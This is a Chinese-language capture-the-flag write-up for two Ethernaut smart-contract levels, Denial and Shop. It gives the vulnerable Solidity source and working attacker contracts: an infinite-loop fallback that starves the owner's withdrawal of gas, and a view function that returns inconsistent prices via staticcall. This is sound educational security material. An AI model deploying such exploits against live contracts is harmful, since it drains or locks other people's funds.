### 第二十题 Denial
### 题目
这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。
通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）。
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
    //允许任何人设置一个新的提款合作伙伴地址
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        //address(this)表示当前合约的地址。具体来说，它将当前合约实例转换为一个address类型
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
### 解题思路&过程
1. partner.call在调用call函数时没有检查返回值，也没有指定gas，这就导致如果外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现out of gas的错误，从而revert，也自然不会执行owner.transfer操作。
2. 部署合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackDenial {
    address public target;
    constructor (address payable _addr) public payable {
        target=_addr;
        target.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    fallback() payable external {
        while(true){
        }
    }
}
```
### 第二十一题 Shop
### 题目
您能在商店以低于要求的价格购买到商品吗？
### 提示
- shop合约预计由买家使用
- 了解view函数的限制
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    //view只读
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
### 解题思路&过程
1. 关键点在isSold变量，在第一次调用price函数时，这个变量为false，而第二次为true，利用这一点，我们可以完成判断返回。但是由于view函数不允许低级的call，所以我们无法使用call调用isSold函数，但solidity有一个staticcall不会改变状态，并且可以在view函数内部使用，替代一下即可。
2. 部署合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Buyer {
  function price() external view returns (uint);
}
contract AttackShop is Buyer {
    address public victim;
    constructor(address _victim) {
        victim = _victim;
    }
    function buy() public {
        bytes memory payload = abi.encodeWithSignature("buy()");
        victim.call(payload);
    }
    function price() public view override returns(uint) {
        bytes memory payload = abi.encodeWithSignature("isSold()");
        (, bytes memory result) = victim.staticcall(payload);
        bool sold = abi.decode(result, (bool));
        return sold ? 1 : 101;
    }
}
```
4. 直接buy（）
5. 提交
